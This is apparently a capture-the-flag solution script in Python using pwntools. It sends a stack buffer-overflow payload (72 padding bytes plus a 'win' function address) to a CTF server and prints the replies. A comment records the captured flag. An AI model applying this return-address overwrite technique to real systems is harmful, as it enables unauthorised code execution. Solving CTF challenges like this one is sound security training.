from pwn import *

win_addr = b"\x96\x11\x40\x00"
payload = b"\x41"*72 + win_addr

conn = remote('shell.actf.co', 21830)
response = conn.recvline()
print(response)
conn.sendline(payload)
response = conn.recvline()
print(response)
response = conn.recvline()
print(response)
# returns actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}
